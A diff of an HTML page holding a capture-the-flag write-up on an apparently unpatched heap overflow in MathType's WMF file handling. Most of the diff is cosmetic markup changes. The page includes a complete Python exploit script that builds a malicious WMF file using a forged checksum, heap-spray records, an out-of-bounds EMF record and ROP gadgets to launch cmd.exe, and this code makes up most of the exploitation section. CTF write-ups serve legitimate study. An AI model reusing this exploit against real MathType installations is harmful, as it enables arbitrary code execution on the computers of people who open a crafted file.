@@ -160,7 +160,7 @@
     
             <li class="nav-item dropdown d-sm-block d-md-none">
               <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                construction-&-exploitation
+                construction--exploitation
               </a>
               <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                 
@@ -223,7 +223,7 @@
           <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
             <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
               <span class="fa fa-dashboard fa-fw mr-3"></span>
-              <span class="menu-collapsed">construction-&-exploitation</span>
+              <span class="menu-collapsed">construction--exploitation</span>
               <span class="submenu-icon ml-auto"></span>
             </div>
           </a>
@@ -256,7 +256,7 @@
         </ul>
       </div>
       <div class="col-10 py-3">
-        <article class="markdown-body"><h1 id="mtp-writeup-(0day)"><a class="header-link" href="#mtp-writeup-(0day)"></a>MTP Writeup (0day)</h1>
+        <article class="markdown-body"><h1 id="mtp-writeup-0day"><a class="header-link" href="#mtp-writeup-0day"></a>MTP Writeup (0day)</h1>
 <p>Last week I solved an interesting challenge, which is actually a 0day bug.  </p>
 <p>We were given a software called <a href="https://www.dessci.com/en/products/mathtype/">MathType</a>, and we need to pop a calc by using a wmf file with the modified version of this software.</p>
 <p>It also said it is an unpatched heap overflow bug, so let&#39;s begin!</p>
@@ -264,9 +264,9 @@
 <p>The first thought after I saw the challenge description was we need a fuzzing, but I wanna reverse and locate the code processing wmf file.</p>
 <p>Simply generating a wmf file by File-&gt;Save menu, attach with your debugger and put a breakpoint at <strong>CreateFileW</strong>(I believe they don&#39;t use some hack trick like NtCreateFile or direct syscall). </p>
 <p>Now load the file you just saved, breakpoint triggered immediately.</p>
-<p>Btw, They <strong><em>removed</em></strong> ASLR in patched version of MathType.</p>
+<p>Btw, They <em><strong>removed</strong></em> ASLR in patched version of MathType.</p>
 <p class="img-container"><img src="img/1.jpg" alt="CreateFile"></p>
-<p>But where is the code that actually process WMF file? Now put a breakpoint at <strong><em>ReadFile</em></strong>.</p>
+<p>But where is the code that actually process WMF file? Now put a breakpoint at <em><strong>ReadFile</strong></em>.</p>
 <p>Here is the stack trace when we hit ReadFile.</p>
 <p class="img-container"><img src="img/2.jpg" alt="ReadFile"></p>
 <p>Now we inspect the code at 0x004555AC , as below.</p>
@@ -289,7 +289,7 @@
 <p>Wait WTF is that checksum? How we compute it?</p>
 <p class="img-container"><img src="img/8.jpg" alt=""></p>
 <p>OK, seems a very simple checksum algorithm. Simply xor each byte.</p>
-<h2 id="construction-&-exploitation"><a class="header-link" href="#construction-&-exploitation"></a>Construction &amp; Exploitation</h2>
+<h2 id="construction--exploitation"><a class="header-link" href="#construction--exploitation"></a>Construction &amp; Exploitation</h2>
 <p>Now we saw an unlimited heap overflow bug by reversing program, but how to trigger it?</p>
 <p>Let&#39;s review the code.</p>
 <p class="img-container"><img src="img/6.jpg" alt=""></p>
@@ -328,20 +328,20 @@
 <span class="hljs-keyword">import</span> base64
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p32</span><span class="hljs-params">(data)</span>:</span>
-    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">'&lt;I'</span>, data)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p32</span>(<span class="hljs-params">data</span>):</span>
+    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data)
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p16</span><span class="hljs-params">(data)</span>:</span>
-    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">'&lt;H'</span>, data)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p16</span>(<span class="hljs-params">data</span>):</span>
+    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, data)
 
 
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Header</span>:</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
         self.key = <span class="hljs-number">0x9AC6CDD7</span>
         self.HWmf = <span class="hljs-number">0</span>
         self.left = self.top = self.right = self.bottom = self.inch = self.reserved = <span class="hljs-number">0</span>
-        self.type = <span class="hljs-number">1</span>
+        self.<span class="hljs-built_in">type</span> = <span class="hljs-number">1</span>
         self.HeaderSize = <span class="hljs-number">9</span>
         self.version = <span class="hljs-number">0x300</span>
         self.size = <span class="hljs-number">9</span>
@@ -350,21 +350,21 @@
         self.NumberOfMembers = <span class="hljs-number">0</span>
         self.Records = []
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span><span class="hljs-params">(self)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
 
         self + Record()
 
-        s = pack(<span class="hljs-string">'&lt;I'</span>, self.key)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.HWmf)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.left)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.top)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.right)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.bottom)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.inch)
-        s += pack(<span class="hljs-string">'&lt;I'</span>, self.reserved)
-        s += pack(<span class="hljs-string">'&lt;H'</span>, self.checksum(s))
+        s = pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, self.key)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.HWmf)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.left)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.top)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.right)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.bottom)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.inch)
+        s += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, self.reserved)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.checksum(s))
 
-        s += p16(self.type)
+        s += p16(self.<span class="hljs-built_in">type</span>)
         s += p16(self.HeaderSize)
         s += p16(self.version)
         s += p32(self.size)
@@ -373,52 +373,52 @@
         s += p16(self.NumberOfMembers)
 
         <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> self.Records:
-            s += bytes(r)
+            s += <span class="hljs-built_in">bytes</span>(r)
         <span class="hljs-keyword">return</span> s
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checksum</span><span class="hljs-params">(self, s)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checksum</span>(<span class="hljs-params">self, s</span>):</span>
         c = <span class="hljs-number">0</span>
-        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(int(len(s) / <span class="hljs-number">2</span>)):
-            c ^= unpack(<span class="hljs-string">'&lt;H'</span>, s[<span class="hljs-number">2</span> * x:<span class="hljs-number">2</span> * x + <span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]
+        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(s) / <span class="hljs-number">2</span>)):
+            c ^= unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, s[<span class="hljs-number">2</span> * x:<span class="hljs-number">2</span> * x + <span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]
         <span class="hljs-keyword">return</span> c
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span><span class="hljs-params">(self, other)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span>(<span class="hljs-params">self, other</span>):</span>
         self.Records.append(other)
-        rs = len(bytes(other))
+        rs = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(other))
         <span class="hljs-keyword">if</span> rs &gt; self.MaxRecord:
             self.MaxRecord = rs
-        self.size += int(rs / <span class="hljs-number">2</span>)
+        self.size += <span class="hljs-built_in">int</span>(rs / <span class="hljs-number">2</span>)
         <span class="hljs-keyword">return</span> self
 
 
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Record</span>:</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
         self.RecordFunction = <span class="hljs-number">0</span>
         self.RecordSize = <span class="hljs-number">3</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span><span class="hljs-params">(self)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
         s = p32(self.RecordSize)
         s += p16(self.RecordFunction)
         <span class="hljs-keyword">return</span> s
 
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PWNRecord</span><span class="hljs-params">(Record)</span>:</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, size, buf=None)</span>:</span>
-        super(PWNRecord, self).__init__()
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PWNRecord</span>(<span class="hljs-params">Record</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, size, buf=<span class="hljs-literal">None</span></span>):</span>
+        <span class="hljs-built_in">super</span>(PWNRecord, self).__init__()
         self.RecordFunction = <span class="hljs-number">0x2019</span>
         self.size = size
         self.buf = buf
         <span class="hljs-keyword">if</span> self.buf:
-            length = len(buf)
+            length = <span class="hljs-built_in">len</span>(buf)
             <span class="hljs-keyword">if</span> length &amp; <span class="hljs-number">1</span>:
                 length += <span class="hljs-number">1</span>
-                buf += <span class="hljs-string">'\x00'</span>.encode()
-            self.RecordSize += <span class="hljs-number">4</span> + int(length / <span class="hljs-number">2</span>)
+                buf += <span class="hljs-string">&#x27;\x00&#x27;</span>.encode()
+            self.RecordSize += <span class="hljs-number">4</span> + <span class="hljs-built_in">int</span>(length / <span class="hljs-number">2</span>)
         <span class="hljs-keyword">else</span>:
             self.RecordSize += <span class="hljs-number">6</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span><span class="hljs-params">(self)</span>:</span>
-        s = super(PWNRecord, self).__bytes__()
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
+        s = <span class="hljs-built_in">super</span>(PWNRecord, self).__bytes__()
         s += p32(<span class="hljs-number">0x233</span>)
         s += p32(self.size)
         <span class="hljs-keyword">if</span> self.buf:
@@ -428,32 +428,32 @@
         <span class="hljs-keyword">return</span> s
 
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EMFRecord</span><span class="hljs-params">(Record)</span>:</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, data)</span>:</span>
-        super(EMFRecord, self).__init__()
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EMFRecord</span>(<span class="hljs-params">Record</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, data</span>):</span>
+        <span class="hljs-built_in">super</span>(EMFRecord, self).__init__()
         self.RecordFunction = <span class="hljs-number">1574</span>
 
         self.efun = <span class="hljs-number">0</span>
         self.bytecount = <span class="hljs-number">0</span>
-        self.CommentIdentifier = <span class="hljs-string">'AppsMFCC'</span>.encode()
+        self.CommentIdentifier = <span class="hljs-string">&#x27;AppsMFCC&#x27;</span>.encode()
 
         self.RecordSize += <span class="hljs-number">11</span>
-        length = len(data)
+        length = <span class="hljs-built_in">len</span>(data)
         <span class="hljs-keyword">if</span> length &amp; <span class="hljs-number">1</span>:
-            data += <span class="hljs-string">'\x00'</span>.encode()
+            data += <span class="hljs-string">&#x27;\x00&#x27;</span>.encode()
             length += <span class="hljs-number">1</span>
 
-        self.RecordSize += int(length / <span class="hljs-number">2</span>)
+        self.RecordSize += <span class="hljs-built_in">int</span>(length / <span class="hljs-number">2</span>)
         self.alloc_size = <span class="hljs-number">0</span>
         self.buff_size = <span class="hljs-number">0</span>
         self.version = <span class="hljs-number">1</span>
-        <span class="hljs-keyword">if</span> isinstance(data, str):
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):
             self.data = data.encode()
         <span class="hljs-keyword">else</span>:
             self.data = data
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span><span class="hljs-params">(self)</span>:</span>
-        s = super(EMFRecord, self).__bytes__()
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
+        s = <span class="hljs-built_in">super</span>(EMFRecord, self).__bytes__()
         s += p16(self.efun)
         s += p16(self.bytecount)
         s += self.CommentIdentifier
@@ -464,23 +464,23 @@
         <span class="hljs-keyword">return</span> s
 
 
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
     h = Header()
     h.right = <span class="hljs-number">7168</span>
     h.bottom = <span class="hljs-number">512</span>
     h.inch = <span class="hljs-number">2304</span>
-    h + PWNRecord(<span class="hljs-number">0x20</span>, <span class="hljs-string">'cmd.exe\x00'</span>.encode())
-    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1000</span>):
+    h + PWNRecord(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;cmd.exe\x00&#x27;</span>.encode())
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
         h + PWNRecord(<span class="hljs-number">0x108</span>)
 
-    payload = <span class="hljs-string">'Design Science, Inc.\x00'</span>.encode()
+    payload = <span class="hljs-string">&#x27;Design Science, Inc.\x00&#x27;</span>.encode()
     <span class="hljs-comment"># original data from test</span>
-    payload += base64.b64decode(<span class="hljs-string">'''BQEABwREU01UNwAAE1dpbkFsbEJhc2ljQ29kZVBhZ2VzABEFVGltZXMgTmV3IFJv
+    payload += base64.b64decode(<span class="hljs-string">&#x27;&#x27;&#x27;BQEABwREU01UNwAAE1dpbkFsbEJhc2ljQ29kZVBhZ2VzABEFVGltZXMgTmV3IFJv
 bWFuABEDU3ltYm9sABEFQ291cmllciBOZXcAEQRNVCBFeHRyYQATV2luQU5TSQAR
 BlRlYW1WaWV3ZXIxMwASAAghL0WPRC9BUPQQD0dfQVDyHx5BUPQVD0EA9EX0JfSP
 Ql9BAPQQD0NfQQD0j0X0Kl9I9I9BAPQQD0D0j0F/SPQQD0EqX0RfRfRfRfRfQQ8M
 AQABAAECAgICAAIAAQEBAAMAAQAEAAUACgAA
-'''</span>)
+&#x27;&#x27;&#x27;</span>)
 
     e = EMFRecord(payload)
     e.efun = <span class="hljs-number">0xf</span>
@@ -490,14 +490,14 @@ AQABAAECAgICAAIAAQEBAAMAAQAEAAUACgAA
 
     h + e
 
-    payload = <span class="hljs-string">'Design Science, Inc.\x00'</span>
-    payload += <span class="hljs-string">'A'</span> * <span class="hljs-number">0x3e</span>
+    payload = <span class="hljs-string">&#x27;Design Science, Inc.\x00&#x27;</span>
+    payload += <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x3e</span>
 
     payload = payload.encode()
 
     payload += p32(<span class="hljs-number">0x00753053</span>)  <span class="hljs-comment"># gadget 1 0x00753053: pop esi ; pop esp ; pop ebp ; ret  ;  (6 found)</span>
     payload += p32(<span class="hljs-number">0x0043b056</span>)  <span class="hljs-comment"># 0x0043b056: add esp, 0x18 ; ret  ;  (2 found)</span>
-    payload += <span class="hljs-string">'Design Science, Inc.\x00\x00\x00\x00'</span>.encode()
+    payload += <span class="hljs-string">&#x27;Design Science, Inc.\x00\x00\x00\x00&#x27;</span>.encode()
 
     <span class="hljs-comment"># 0x004f086e: pop eax ; ret  ;  (51 found)</span>
     <span class="hljs-comment"># 0x004f0e9c: mov dword [ecx], eax ; ret</span>
@@ -517,13 +517,13 @@ AQABAAECAgICAAIAAQEBAAMAAQAEAAUACgAA
     e = EMFRecord(payload)
     e.efun = <span class="hljs-number">0xf</span>
     e.bytecount = <span class="hljs-number">0x100</span>
-    e.alloc_size = <span class="hljs-number">0x108</span>  <span class="hljs-comment"># it doesn't matter</span>
-    e.buff_size = len(payload)  <span class="hljs-comment"># oob</span>
+    e.alloc_size = <span class="hljs-number">0x108</span>  <span class="hljs-comment"># it doesn&#x27;t matter</span>
+    e.buff_size = <span class="hljs-built_in">len</span>(payload)  <span class="hljs-comment"># oob</span>
 
     h + e
 
-    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'exp.wmf'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
-        f.write(bytes(h))</code></pre><h2 id="final-words"><a class="header-link" href="#final-words"></a>Final words</h2>
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.wmf&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:
+        f.write(<span class="hljs-built_in">bytes</span>(h))</code></pre><h2 id="final-words"><a class="header-link" href="#final-words"></a>Final words</h2>
 <p>Thanks for organizer! Such an interesting challenge!. Btw heap manipulation works the way that I don&#39;t think it works :).</p>
         </article>
       </div>
